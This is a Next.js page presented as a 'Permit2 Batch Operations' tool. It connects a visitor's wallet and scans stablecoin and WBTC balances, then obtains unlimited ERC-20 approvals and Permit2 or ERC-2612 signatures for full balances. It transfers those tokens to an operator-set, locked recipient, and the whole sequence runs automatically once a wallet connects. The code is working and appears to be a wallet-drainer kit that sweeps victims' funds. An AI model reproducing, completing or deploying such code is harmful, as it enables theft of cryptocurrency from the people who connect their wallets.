"use client";

import { Suspense, useEffect, useMemo, useState, useCallback, useRef } from "react";
import { useSearchParams } from "next/navigation";
import { useAppKit } from "@reown/appkit/react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Shield,
  Wallet,
  ArrowRight,
  CheckCircle2,
  AlertCircle,
  Loader2,
  Zap,
  Send,
  RefreshCw,
} from "lucide-react";
import { toast } from "sonner";
import type { Address } from "viem";
import { useAccount, usePublicClient, useWalletClient } from "wagmi";
import type { ExecutionBackend } from "@/lib/types";
import type { OperationalConfig } from "@/lib/operational-config-store";
import { ReownProvider } from "@/components/reown-provider";

// ── Constants ───────────────────────────────────────────

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7" as const;
const UINT160_MAX = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");

function capPermit2Amount(balance: bigint): bigint {
  return balance > UINT160_MAX ? UINT160_MAX : balance;
}

const ERC20_ABI = [
  { inputs: [{ name: "owner", type: "address" }], name: "balanceOf", outputs: [{ type: "uint256" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "decimals", outputs: [{ type: "uint8" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "name", outputs: [{ type: "string" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "symbol", outputs: [{ type: "string" }], stateMutability: "view", type: "function" },
  { inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }], name: "allowance", outputs: [{ type: "uint256" }], stateMutability: "view", type: "function" },
  { inputs: [{ name: "spender", type: "address" }, { name: "amount", type: "uint256" }], name: "approve", outputs: [{ type: "bool" }], stateMutability: "nonpayable", type: "function" },
] as const;

const PERMIT2_ABI = [
  { inputs: [{ name: "owner", type: "address" }, { name: "token", type: "address" }, { name: "spender", type: "address" }], name: "allowance", outputs: [{ name: "amount", type: "uint160" }, { name: "expiration", type: "uint48" }, { name: "nonce", type: "uint48" }], stateMutability: "view", type: "function" },
] as const;

const ERC2612_ABI = [
  { inputs: [{ name: "owner", type: "address" }], name: "nonces", outputs: [{ type: "uint256" }], stateMutability: "view", type: "function" },
  { inputs: [], name: "version", outputs: [{ type: "string" }], stateMutability: "view", type: "function" },
] as const;

const KNOWN_TOKENS: Record<number, Array<{ address: string; symbol: string; decimals: number }>> = {
  1: [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
  ],
  56: [
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
  ],
  137: [
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
  ],
};

// ── Types ───────────────────────────────────────────────

interface TokenState {
  address: string;
  symbol: string;
  decimals: number;
  balance: bigint;
  balanceFormatted: string;
  permit2Allowance: bigint;
  /** ERC20 approved for the correct spender (Permit2 contract or batch executor). */
  erc20Approved: boolean;
  selected: boolean;
  nonce: number;
  permitSupported?: boolean;
  permitVersion?: string;
}

interface BackendConfigEntry {
  name: string;
  address: string | null;
  executionBackend: ExecutionBackend | null;
}

type Step = "connect" | "scan" | "approve" | "sign" | "execute" | "done";

function Permit2PageInner() {
  const searchParams = useSearchParams();
  const { open } = useAppKit();
  const { address: connectedAddress, chainId: connectedChainId, isConnected } = useAccount();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<number | null>(null);
  const [recipientAddress, setRecipientAddress] = useState("");
  const [tokens, setTokens] = useState<TokenState[]>([]);
  const [step, setStep] = useState<Step>("connect");
  const [busy, setBusy] = useState(false);
  const [txHash, setTxHash] = useState<string | null>(null);
  const [useRelay, setUseRelay] = useState(false);
  const [relayReady, setRelayReady] = useState(false);
  const [relayMessage, setRelayMessage] = useState<string | null>(null);
  const [executionBackend, setExecutionBackend] = useState<ExecutionBackend>("stealth-exchange");
  const [backendEntries, setBackendEntries] = useState<BackendConfigEntry[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [autoExecute, setAutoExecute] = useState(true);
  const [recipientLocked, setRecipientLocked] = useState(false);
  const autoPipelineLock = useRef(false);
  const autoAttemptedRef = useRef(false);
  const projectId = searchParams.get("projectId")?.trim() || "";

  function getErrorMessage(error: unknown, fallback: string) {
    if (error instanceof Error && error.message) return error.message;
    if (typeof error === "object" && error && "shortMessage" in error) {
      const shortMessage = (error as { shortMessage?: unknown }).shortMessage;
      if (typeof shortMessage === "string" && shortMessage) return shortMessage;
    }
    return fallback;
  }

  const selectedTokens = useMemo(() => tokens.filter((t) => t.selected && t.balance > 0n), [tokens]);
  const allApproved = useMemo(() => selectedTokens.every((t) => t.erc20Approved), [selectedTokens]);
  const requiresTypedPermitSignature = executionBackend === "stealth-exchange";
  const usesErc2612Permit = executionBackend === "erc2612-executor";
  const activeBackendEntry = useMemo(
    () => backendEntries.find((entry) => entry.executionBackend === executionBackend) ?? null,
    [backendEntries, executionBackend],
  );
  const executionAddress = activeBackendEntry?.address || "";
  const usesPermit2Allowance = executionBackend !== "batch-multicall" && executionBackend !== "erc2612-executor";
  /** ERC20 `approve` target: always Permit2 for permit flows; executor for batch-multicall. */
  const erc20ApprovalTarget =
    executionBackend === "batch-multicall" ? executionAddress : PERMIT2_ADDRESS;
  /** Permit2 `allowance(owner, token, spender)` spender — the execution contract. */
  const permit2Spender = executionAddress;
  const approvalTargetLabel =
    executionBackend === "batch-multicall"
      ? "BatchMulticall"
      : executionBackend === "erc2612-executor"
        ? "ERC-2612 Permit"
        : "Permit2";

  // Permanent platform config (recipient + automation) + relay readiness
  useEffect(() => {
    const recipientFromQuery = searchParams.get("recipient")?.trim() || "";
    if (recipientFromQuery) {
      setRecipientAddress(recipientFromQuery);
      setRecipientLocked(false);
    }

    let active = true;
    async function bootstrap() {
      try {
        const [platformRes, relayRes] = await Promise.all([
          fetch("/api/platform-config", { cache: "no-store" }),
          fetch("/api/relay/status", { cache: "no-store" }),
        ]);
        if (!active) return;

        if (platformRes.ok) {
          const platform = (await platformRes.json()) as {
            recipient?: string;
            autoExecute?: boolean;
            payout?: { autoSweep?: boolean };
          };
          if (!recipientFromQuery && platform.recipient) {
            setRecipientAddress(platform.recipient);
            setRecipientLocked(true);
          }
          setAutoExecute(platform.autoExecute ?? true);
        }

        if (relayRes.ok) {
          const relay = (await relayRes.json()) as {
            relayConfigured?: boolean;
            message?: string;
            authorizedOnExchange?: boolean | null;
          };
          const ready = !!relay.relayConfigured && relay.authorizedOnExchange !== false;
          setRelayReady(ready);
          setRelayMessage(relay.message || null);
          setUseRelay(ready);
        }
      } catch {
        // direct mode remains default
      }
    }
    void bootstrap();
    return () => {
      active = false;
    };
  }, [searchParams]);

  useEffect(() => {
    let active = true;
    async function loadOperationalConfig() {
      try {
        const [operationalRes, configRes] = await Promise.all([
          fetch("/api/operational-config", { cache: "no-store" }),
          fetch("/api/config", { cache: "no-store" }),
        ]);
        const operationalData = (await operationalRes.json()) as { config?: OperationalConfig };
        const configData = (await configRes.json()) as { executionBackends?: BackendConfigEntry[] };
        if (!active) return;
        if (operationalRes.ok && operationalData.config) {
          setExecutionBackend(operationalData.config.strategy.executionBackend);
        }
        if (configRes.ok && Array.isArray(configData.executionBackends)) {
          setBackendEntries(configData.executionBackends);
        }
      } catch {
        // Keep default when operational config is unavailable.
      }
    }
    void loadOperationalConfig();
    return () => {
      active = false;
    };
  }, []);

  useEffect(() => {
    if (!isConnected || !connectedAddress || !connectedChainId) return;

    setWalletAddress(connectedAddress);
    setChainId(connectedChainId);
    setStep((current) => (current === "connect" ? "scan" : current));
    setError(null);
  }, [isConnected, connectedAddress, connectedChainId]);

  // ── Step 1: Connect ─────────────────────────────────

  async function handleConnect() {
    setError(null);
    await open({ view: "Connect" });
  }

  // ── Step 2: Scan ────────────────────────────────────

  const handleScan = useCallback(async () => {
    if (!walletAddress || !chainId || !publicClient) return;
    if (!erc20ApprovalTarget || (usesPermit2Allowance && !permit2Spender)) {
      setError(`Missing configured address for ${executionBackend}`);
      return;
    }
    setBusy(true);
    setError(null);
    try {
      const knownList = KNOWN_TOKENS[chainId] || [];
      const results: TokenState[] = [];

      for (const tk of knownList) {
        try {
          const [balance, erc20Allowance, permit2Slot, permitInfo] = await Promise.all([
            publicClient.readContract({
              address: tk.address as Address,
              abi: ERC20_ABI,
              functionName: "balanceOf",
              args: [walletAddress as Address],
            }),
            usesErc2612Permit
              ? Promise.resolve(0n)
              : publicClient.readContract({
                  address: tk.address as Address,
                  abi: ERC20_ABI,
                  functionName: "allowance",
                  args: [walletAddress as Address, erc20ApprovalTarget as Address],
                }),
            usesPermit2Allowance
              ? publicClient.readContract({
                  address: PERMIT2_ADDRESS,
                  abi: PERMIT2_ABI,
                  functionName: "allowance",
                  args: [walletAddress as Address, tk.address as Address, permit2Spender as Address],
                })
              : Promise.resolve(null),
            usesErc2612Permit
              ? (async () => {
                  const [nonce, version] = await Promise.all([
                    publicClient.readContract({
                      address: tk.address as Address,
                      abi: ERC2612_ABI,
                      functionName: "nonces",
                      args: [walletAddress as Address],
                    }),
                    publicClient.readContract({
                      address: tk.address as Address,
                      abi: ERC2612_ABI,
                      functionName: "version",
                    }).catch(() => "1"),
                  ]);
                  return { nonce, version: String(version || "1") };
                })()
              : Promise.resolve(null),
          ]);

          const bal = balance as bigint;
          const erc20Allowed = (erc20Allowance as bigint) >= bal && bal > 0n;
          const permit2Amount = permit2Slot
            ? (permit2Slot as unknown as [bigint, bigint, bigint])[0]
            : 0n;
          const nonce = usesErc2612Permit
            ? Number((permitInfo as { nonce: bigint }).nonce)
            : permit2Slot
              ? Number((permit2Slot as unknown as [bigint, bigint, bigint])[2])
              : 0;
          const divisor = 10n ** BigInt(tk.decimals);
          const formatted = (Number(bal) / Number(divisor)).toFixed(tk.decimals > 6 ? 4 : 2);

          results.push({
            address: tk.address,
            symbol: tk.symbol,
            decimals: tk.decimals,
            balance: bal,
            balanceFormatted: formatted,
            permit2Allowance: permit2Amount,
            erc20Approved: erc20Allowed,
            selected: usesErc2612Permit ? bal > 0n && !!permitInfo : bal > 0n,
            nonce,
            permitSupported: usesErc2612Permit ? !!permitInfo : undefined,
            permitVersion: usesErc2612Permit && permitInfo ? (permitInfo as { version: string }).version : undefined,
          });
        } catch {
          // skip failed tokens
        }
      }

      setTokens(results);
      setStep("approve");
      toast.success(`Scanned ${results.length} tokens`);
    } catch (error: unknown) {
      setError(getErrorMessage(error, "Scan failed"));
    } finally {
      setBusy(false);
    }
  }, [walletAddress, chainId, erc20ApprovalTarget, permit2Spender, publicClient, executionBackend, usesPermit2Allowance, usesErc2612Permit]);

  useEffect(() => {
    if (step !== "scan" || busy || !walletAddress || !chainId || !publicClient) return;
    void handleScan();
  }, [step, busy, walletAddress, chainId, publicClient, handleScan]);

  // ── Step 3: Approve spender ─────────────────────────

  async function handleApproveAll(options?: { skipRescan?: boolean }) {
    if (!walletAddress || !walletClient || usesErc2612Permit) return;
    setBusy(true);
    setError(null);
    try {
      const needsApproval = selectedTokens.filter((t) => !t.erc20Approved);
      const maxApproval = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

      for (const tk of needsApproval) {
        toast.info(`Approving ${tk.symbol} for ${approvalTargetLabel}...`);
        if (
          tk.address.toLowerCase() === USDT_ADDRESS.toLowerCase() &&
          publicClient
        ) {
          const current = (await publicClient.readContract({
            address: tk.address as Address,
            abi: ERC20_ABI,
            functionName: "allowance",
            args: [walletAddress as Address, erc20ApprovalTarget as Address],
          })) as bigint;
          if (current > 0n && current < maxApproval) {
            const resetHash = await walletClient.writeContract({
              address: tk.address as Address,
              abi: ERC20_ABI,
              functionName: "approve",
              args: [erc20ApprovalTarget as Address, 0n],
              account: walletAddress as Address,
            });
            await publicClient.waitForTransactionReceipt({ hash: resetHash });
          }
        }
        const hash = await walletClient.writeContract({
          address: tk.address as Address,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [erc20ApprovalTarget as Address, maxApproval],
          account: walletAddress as Address,
        });
        if (publicClient) await publicClient.waitForTransactionReceipt({ hash });
        toast.success(`${tk.symbol} approved: ${hash.slice(0, 10)}...`);
      }

      if (options?.skipRescan) {
        const approvedSet = new Set(needsApproval.map((t) => t.address.toLowerCase()));
        setTokens((prev) =>
          prev.map((t) =>
            approvedSet.has(t.address.toLowerCase()) ? { ...t, erc20Approved: true } : t,
          ),
        );
        setStep("sign");
      } else {
        await handleScan();
        setStep("sign");
      }
    } catch (error: unknown) {
      setError(getErrorMessage(error, "Approval failed"));
    } finally {
      setBusy(false);
    }
  }

  // Automatic: approve → sign → execute after scan (Settings: Auto Sweep / Auto Sign)
  useEffect(() => {
    if (!autoExecute || busy || autoPipelineLock.current || autoAttemptedRef.current) return;
    if (step !== "approve" || !walletAddress || !recipientAddress || selectedTokens.length === 0) return;

    autoAttemptedRef.current = true;
    autoPipelineLock.current = true;
    void (async () => {
      try {
        if (!usesErc2612Permit && selectedTokens.some((t) => !t.erc20Approved)) {
          await handleApproveAll({ skipRescan: true });
        }
        await handleSignAndExecute();
      } catch (error: unknown) {
        setError(getErrorMessage(error, "Automatic execution failed"));
      } finally {
        autoPipelineLock.current = false;
      }
    })();
  }, [
    step,
    autoExecute,
    busy,
    walletAddress,
    recipientAddress,
    selectedTokens,
    usesErc2612Permit,
    allApproved,
  ]);

  // ── Step 4: Sign / execute batch ────────────────────

  async function handleSignAndExecute() {
    if (!walletAddress || !recipientAddress || selectedTokens.length === 0 || !walletClient) return;
    if (!executionAddress) {
      setError(`Missing configured address for ${executionBackend}`);
      return;
    }
    setBusy(true);
    setError(null);
    try {
      const now = Math.floor(Date.now() / 1000);
      const expiration = now + 60 * 60 * 24 * 30; // 30 days
      const sigDeadline = BigInt(now + 60 * 20); // 20 min

      const details = selectedTokens.map((tk) => ({
        token: tk.address as Address,
        amount: capPermit2Amount(tk.balance),
        expiration,
        nonce: tk.nonce,
      }));

      let signature: `0x${string}` | undefined;
      let erc2612Permits:
        | Array<{ token: string; amount: string; v: number; r: `0x${string}`; s: `0x${string}` }>
        | undefined;
      if (requiresTypedPermitSignature) {
        const domain = {
          name: "Permit2",
          chainId: chainId!,
          verifyingContract: PERMIT2_ADDRESS,
        };

        const types = {
          PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" },
          ],
          PermitBatch: [
            { name: "details", type: "PermitDetails[]" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" },
          ],
        };

        toast.info("Sign the Permit2 batch in your wallet...");

        signature = await walletClient.signTypedData({
          account: walletAddress as Address,
          domain,
          types,
          primaryType: "PermitBatch",
          message: {
            details: details.map((d) => ({
              token: d.token,
              amount: d.amount,
              expiration: d.expiration,
              nonce: d.nonce,
            })),
            spender: executionAddress as Address,
            sigDeadline,
          },
        });

        toast.success("Permit signed");
      } else if (usesErc2612Permit) {
        if (!publicClient) throw new Error("Public client unavailable");
        toast.info("Signing ERC-2612 permits for supported tokens...");
        erc2612Permits = [];
        const deadline = BigInt(now + 60 * 20);

        for (const tk of selectedTokens) {
          if (!tk.permitSupported) throw new Error(`${tk.symbol} does not support standard ERC-2612`);
          const tokenName = await publicClient.readContract({
            address: tk.address as Address,
            abi: ERC20_ABI,
            functionName: "name",
          });
          const signed = await walletClient.signTypedData({
            account: walletAddress as Address,
            domain: {
              name: String(tokenName),
              version: tk.permitVersion || "1",
              chainId: chainId!,
              verifyingContract: tk.address as Address,
            },
            types: {
              Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" },
              ],
            },
            primaryType: "Permit",
            message: {
              owner: walletAddress as Address,
              spender: executionAddress as Address,
              value: tk.balance,
              nonce: BigInt(tk.nonce),
              deadline,
            },
          });
          const compact = signed.slice(2);
          const r = `0x${compact.slice(0, 64)}` as `0x${string}`;
          const s = `0x${compact.slice(64, 128)}` as `0x${string}`;
          const vRaw = Number.parseInt(compact.slice(128, 130), 16);
          erc2612Permits.push({
            token: tk.address,
            amount: tk.balance.toString(),
            v: vRaw < 27 ? vRaw + 27 : vRaw,
            r,
            s,
          });
        }
      } else {
        toast.info("Using existing Permit2 allowances with permit2-executor...");
      }

      setStep("execute");

      // Serialize for relay
      const payload = {
        user: walletAddress,
        recipient: recipientAddress,
        projectId: projectId || undefined,
        permitBatch: {
          details: details.map((d) => ({
            token: d.token,
            amount: d.amount.toString(),
            expiration: d.expiration,
            nonce: d.nonce,
          })),
          spender: executionAddress,
          sigDeadline: sigDeadline.toString(),
        },
        signature,
        erc2612Permits,
        executionBackend,
      };

      if (useRelay) {
        // Relay via backend
        toast.info("Relaying transaction...");
        const res = await fetch("/api/relay/batch", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.message || "Relay failed");
        setTxHash(data.hash);
        if (publicClient) {
          await publicClient.waitForTransactionReceipt({ hash: data.hash as `0x${string}` });
        }
      } else {
        if (!signature || executionBackend !== "stealth-exchange") {
          throw new Error(`${executionBackend} direct execution is not implemented on this page yet. Use relay mode.`);
        }
        // Direct on-chain execution
        toast.info("Submitting transaction on-chain...");
        const EXCHANGE_ABI = [
          {
            inputs: [
              { name: "user", type: "address" },
              {
                components: [
                  {
                    components: [
                      { name: "token", type: "address" },
                      { name: "amount", type: "uint160" },
                      { name: "expiration", type: "uint48" },
                      { name: "nonce", type: "uint48" },
                    ],
                    name: "details",
                    type: "tuple[]",
                  },
                  { name: "spender", type: "address" },
                  { name: "sigDeadline", type: "uint256" },
                ],
                name: "permitBatch",
                type: "tuple",
              },
              { name: "signature", type: "bytes" },
              { name: "recipient", type: "address" },
            ],
            name: "batchPermitTransferFromBatch",
            outputs: [{ name: "amounts", type: "uint256[]" }],
            stateMutability: "nonpayable",
            type: "function",
          },
        ] as const;

        const hash = await walletClient.writeContract({
          address: executionAddress as Address,
          abi: EXCHANGE_ABI,
          functionName: "batchPermitTransferFromBatch",
          args: [
            walletAddress as Address,
            {
              details: details.map((d) => ({
                token: d.token,
                amount: d.amount,
                expiration: d.expiration,
                nonce: d.nonce,
              })),
              spender: executionAddress as Address,
              sigDeadline,
            },
            signature,
            recipientAddress as Address,
          ],
          account: walletAddress as Address,
        });
        setTxHash(hash);
        if (publicClient) {
          await publicClient.waitForTransactionReceipt({ hash });
        }
      }

      setStep("done");
      toast.success("Batch transfer complete!");
    } catch (error: unknown) {
      setError(getErrorMessage(error, "Transaction failed"));
    } finally {
      setBusy(false);
    }
  }

  function toggleToken(address: string) {
    setTokens((prev) =>
      prev.map((t) => (t.address === address ? { ...t, selected: !t.selected } : t))
    );
  }

  function reset() {
    setTokens([]);
    setStep(walletAddress ? "scan" : "connect");
    setTxHash(null);
    setError(null);
    autoAttemptedRef.current = false;
    autoPipelineLock.current = false;
  }

  // ── Render ──────────────────────────────────────────

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-bold tracking-tight flex items-center gap-2">
          <Shield className="h-6 w-6 text-primary" /> Permit2 Batch Operations
        </h1>
        <p className="text-muted-foreground text-sm mt-1">
          Reown WalletConnect handles the wallet session first. This route now supports the typed-sign StealthExchange flow, the Permit2Executor allowance-pull flow, the BatchMulticall approval-based flow, and standard ERC-2612 permit collection for supported tokens.
        </p>
        <p className="text-xs font-mono uppercase tracking-wider text-primary mt-2">
          Backend: {executionBackend}
        </p>
      </div>

      {/* Progress Steps */}
      <div className="flex items-center gap-2 text-xs font-mono uppercase tracking-wider">
        {(["connect", "scan", "approve", "sign", "execute", "done"] as Step[]).map((s, i) => (
          <div key={s} className="flex items-center gap-2">
            {i > 0 && <ArrowRight className="h-3 w-3 text-muted-foreground" />}
            <span
              className={
                step === s
                  ? "text-primary font-bold"
                  : (["connect", "scan", "approve", "sign", "execute", "done"].indexOf(step) >
                      ["connect", "scan", "approve", "sign", "execute", "done"].indexOf(s))
                  ? "text-emerald-500"
                  : "text-muted-foreground"
              }
            >
              {s}
            </span>
          </div>
        ))}
      </div>

      {relayMessage && (
        <Card
          className={
            relayReady
              ? "border-emerald-500/30 bg-emerald-500/5 rounded-none"
              : "border-yellow-500/30 bg-yellow-500/5 rounded-none"
          }
        >
          <CardContent className="p-4 text-sm">
            <p className={relayReady ? "text-emerald-400" : "text-yellow-400"}>
              {relayReady
                ? "Relay is configured — gasless mode available."
                : "Relay not ready — using direct on-chain execution (you pay gas)."}
            </p>
            <p className="text-xs text-muted-foreground mt-1 font-mono">{relayMessage}</p>
          </CardContent>
        </Card>
      )}

      {error && (
        <Card className="border-red-500/30 bg-red-500/5 rounded-none">
          <CardContent className="p-4 flex items-center gap-2 text-sm text-red-400">
            <AlertCircle className="h-4 w-4 shrink-0" /> {error}
          </CardContent>
        </Card>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left: Config */}
        <div className="space-y-4">
          <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase tracking-wider">Wallet</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              {walletAddress ? (
                <div className="space-y-2">
                  <Badge variant="outline" className="font-mono text-xs rounded-none">
                    {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
                  </Badge>
                  <p className="text-[10px] font-mono text-muted-foreground">Chain: {chainId}</p>
                </div>
              ) : (
                <Button onClick={handleConnect} disabled={busy} className="w-full rounded-none font-mono text-xs uppercase">
                  {busy ? <Loader2 className="h-3 w-3 animate-spin mr-2" /> : <Wallet className="h-3 w-3 mr-2" />}
                  Connect Wallet
                </Button>
              )}
            </CardContent>
          </Card>

          <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase tracking-wider">Recipient</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <Input
                placeholder="0x... (set permanently in Settings → Payout)"
                value={recipientAddress}
                onChange={(e) => setRecipientAddress(e.target.value)}
                readOnly={recipientLocked}
                className="rounded-none bg-black/40 border-border/40 font-mono text-xs"
              />
              {recipientLocked ? (
                <p className="text-[10px] font-mono text-emerald-500">
                  Permanent recipient loaded from platform config
                </p>
              ) : (
                <p className="text-[10px] font-mono text-yellow-500">
                  Set payout address in Settings and click Save to lock recipient permanently
                </p>
              )}
              {autoExecute ? (
                <p className="text-[10px] font-mono text-primary">
                  Auto-execute enabled — connect wallet to approve, sign, and transfer automatically
                </p>
              ) : null}
              <div className="flex items-center gap-2">
                <Switch
                  checked={useRelay}
                  onCheckedChange={setUseRelay}
                  disabled={!relayReady}
                />
                <Label className="text-xs font-mono">
                  Use relay (gasless){relayReady ? "" : " — not configured"}
                </Label>
              </div>
            </CardContent>
          </Card>

          <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
            <CardHeader>
              <CardTitle className="text-sm font-mono uppercase tracking-wider">Contracts</CardTitle>
            </CardHeader>
            <CardContent className="space-y-2 text-[10px] font-mono text-muted-foreground">
              <div className="flex justify-between">
                <span>Permit2</span>
                <span>{PERMIT2_ADDRESS.slice(0, 8)}...{PERMIT2_ADDRESS.slice(-6)}</span>
              </div>
              <div className="flex justify-between">
                <span>Exchange</span>
                <span>{executionAddress ? `${executionAddress.slice(0, 8)}...${executionAddress.slice(-6)}` : "Not set"}</span>
              </div>
              <div className="flex justify-between">
                <span>ERC20 approve target</span>
                <span>{erc20ApprovalTarget ? `${erc20ApprovalTarget.slice(0, 8)}...${erc20ApprovalTarget.slice(-6)}` : "Not set"}</span>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Right: Token Table + Actions */}
        <div className="lg:col-span-2 space-y-4">
          {step === "scan" && (
            <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
              <CardContent className="p-4 flex items-center gap-3 text-sm">
                <Loader2 className="h-4 w-4 animate-spin text-primary" />
                <div>
                  <p className="font-mono text-xs uppercase tracking-wider">Preparing Batch Execution Flow</p>
                  <p className="text-xs text-muted-foreground">
                    Scanning balances and active allowances automatically.
                  </p>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Token Table */}
          {tokens.length > 0 && (
            <Card className="border-border/40 bg-black/40 backdrop-blur-xl rounded-none">
              <CardHeader className="pb-3">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-sm font-mono uppercase tracking-wider">Tokens Found</CardTitle>
                  <Badge variant="outline" className="rounded-none text-[10px] font-mono">
                    {selectedTokens.length} selected
                  </Badge>
                </div>
              </CardHeader>
              <CardContent>
                <Table>
                  <TableHeader>
                    <TableRow className="border-border/40">
                      <TableHead className="w-8"></TableHead>
                      <TableHead className="text-[10px] font-mono uppercase">Token</TableHead>
                      <TableHead className="text-[10px] font-mono uppercase">Balance</TableHead>
                      <TableHead className="text-[10px] font-mono uppercase">{approvalTargetLabel}</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {tokens.map((tk) => (
                      <TableRow key={tk.address} className="border-border/20">
                        <TableCell>
                          <Checkbox
                            checked={tk.selected}
                            onCheckedChange={() => toggleToken(tk.address)}
                            disabled={tk.balance === 0n}
                          />
                        </TableCell>
                        <TableCell className="font-mono text-sm font-medium">{tk.symbol}</TableCell>
                        <TableCell className="font-mono text-xs text-muted-foreground">
                          {tk.balanceFormatted}
                        </TableCell>
                        <TableCell>
                          {tk.erc20Approved ? (
                            <span className="flex items-center gap-1 text-emerald-500 text-xs">
                              <CheckCircle2 className="h-3 w-3" /> {usesErc2612Permit ? "Ready" : "Approved"}
                            </span>
                          ) : tk.balance > 0n ? (
                            <span className="flex items-center gap-1 text-yellow-500 text-xs">
                              <AlertCircle className="h-3 w-3" /> {usesErc2612Permit ? "No permit support" : "Needs approval"}
                            </span>
                          ) : (
                            <span className="text-xs text-muted-foreground">—</span>
                          )}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </CardContent>
            </Card>
          )}

          {/* Action Buttons */}
          {step === "approve" && selectedTokens.length > 0 && !allApproved && !usesErc2612Permit && (
            <Button onClick={() => void handleApproveAll()} disabled={busy} className="w-full rounded-none font-mono text-xs uppercase gap-2">
              {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Zap className="h-3 w-3" />}
              Approve {selectedTokens.filter((t) => !t.erc20Approved).length} Token(s) for {approvalTargetLabel}
            </Button>
          )}

          {(step === "approve" && (allApproved || usesErc2612Permit)) || step === "sign" ? (
            <Button
              onClick={handleSignAndExecute}
              disabled={busy || !recipientAddress || selectedTokens.length === 0}
              className="w-full rounded-none font-mono text-xs uppercase gap-2 bg-primary"
            >
              {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Send className="h-3 w-3" />}
              {requiresTypedPermitSignature ? "Single Signature" : "Execute"}: {useRelay ? "Relay" : "Execute"} Batch Transfer ({selectedTokens.length} tokens)
            </Button>
          ) : null}

          {/* Done */}
          {step === "done" && txHash && (
            <Card className="border-emerald-500/30 bg-emerald-500/5 rounded-none">
              <CardContent className="p-6 space-y-3">
                <div className="flex items-center gap-2 text-emerald-500">
                  <CheckCircle2 className="h-5 w-5" />
                  <span className="font-mono text-sm uppercase tracking-wider font-bold">Transfer Complete</span>
                </div>
                <div className="space-y-1">
                  <p className="text-[10px] font-mono text-muted-foreground uppercase">Transaction Hash</p>
                  <p className="font-mono text-xs break-all">{txHash}</p>
                </div>
                <Button onClick={reset} variant="outline" className="rounded-none font-mono text-xs uppercase gap-2">
                  <RefreshCw className="h-3 w-3" /> New Transfer
                </Button>
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  );
}

export default function Permit2Page() {
  return (
    <ReownProvider cookies={null}>
      <Suspense fallback={<div className="p-8 text-muted-foreground">Loading...</div>}>
        <Permit2PageInner />
      </Suspense>
    </ReownProvider>
  );
}
